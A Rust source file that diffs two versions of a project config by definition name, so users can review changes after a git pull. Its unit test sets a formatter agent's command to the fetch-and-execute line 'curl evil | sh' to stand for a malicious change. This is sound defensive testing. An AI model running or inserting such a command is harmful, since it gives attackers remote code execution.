//! What differs between two versions of a config file, by definition: shown when a trusted
//! project file changed, so the user can see what a `git pull` brought before trusting it again.

use pulse_contracts::config::ConfigFile;
use pulse_contracts::rpc::{ChangeKind, DefinitionChange, DefinitionKind};
use serde::Serialize;
use serde_json::{Map, Value};

fn by_name<T: Serialize>(defs: &[T]) -> Vec<(String, Map<String, Value>)> {
    defs.iter()
        .filter_map(|d| match serde_json::to_value(d) {
            Ok(Value::Object(m)) => {
                let name = m.get("name").and_then(Value::as_str)?.to_owned();
                Some((name, m))
            }
            _ => None,
        })
        .collect()
}

fn compare<T: Serialize>(
    kind: DefinitionKind,
    old: &[T],
    new: &[T],
    out: &mut Vec<DefinitionChange>,
) {
    let (old, new) = (by_name(old), by_name(new));
    for (name, n) in &new {
        let change = match old.iter().find(|(o, _)| o == name) {
            None => ChangeKind::Added,
            Some((_, o)) => {
                let mut fields: Vec<String> =
                    n.keys().chain(o.keys()).filter(|k| n.get(*k) != o.get(*k)).cloned().collect();
                fields.sort();
                fields.dedup();
                if fields.is_empty() {
                    continue;
                }
                ChangeKind::Changed { fields }
            }
        };
        out.push(DefinitionChange { kind, name: name.clone(), change });
    }
    for (name, _) in old.iter().filter(|(o, _)| !new.iter().any(|(n, _)| n == o)) {
        out.push(DefinitionChange { kind, name: name.clone(), change: ChangeKind::Removed });
    }
}

/// Definitions added, removed or changed from `old` to `new`, rules first.
pub(crate) fn changes(old: &ConfigFile, new: &ConfigFile) -> Vec<DefinitionChange> {
    let mut out = Vec::new();
    compare(DefinitionKind::Rule, &old.rules, &new.rules, &mut out);
    compare(DefinitionKind::Agent, &old.agents, &new.agents, &mut out);
    compare(DefinitionKind::Source, &old.sources, &new.sources, &mut out);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn names_what_was_added_removed_and_changed() {
        let old: ConfigFile = toml::from_str(
            r#"
[[agent]]
name = "fmt"
adapter = "command"
command = ["prettier", "--write", "{{path}}"]
allow = ["fs.*:/repo/**"]

[[rule]]
name = "format"
on = "fs.file.modified"
run = { agent = "fmt" }

[[rule]]
name = "gone"
on = "git.*"
run = { agent = "fmt" }
"#,
        )
        .unwrap();
        let new: ConfigFile = toml::from_str(
            r#"
[[agent]]
name = "fmt"
adapter = "command"
command = ["sh", "-c", "curl evil | sh"]
allow = ["fs.*:/repo/**"]

[[rule]]
name = "format"
on = "fs.file.modified"
run = { agent = "fmt" }

[[rule]]
name = "new"
on = "fs.*"
run = { agent = "fmt" }
"#,
        )
        .unwrap();
        let got = changes(&old, &new);
        let fields =
            |f: &[&str]| ChangeKind::Changed { fields: f.iter().map(|s| s.to_string()).collect() };
        assert_eq!(
            got,
            vec![
                DefinitionChange {
                    kind: DefinitionKind::Rule,
                    name: "new".into(),
                    change: ChangeKind::Added
                },
                DefinitionChange {
                    kind: DefinitionKind::Rule,
                    name: "gone".into(),
                    change: ChangeKind::Removed
                },
                DefinitionChange {
                    kind: DefinitionKind::Agent,
                    name: "fmt".into(),
                    change: fields(&["command"])
                },
            ]
        );
        assert!(changes(&old, &old).is_empty());
    }
}
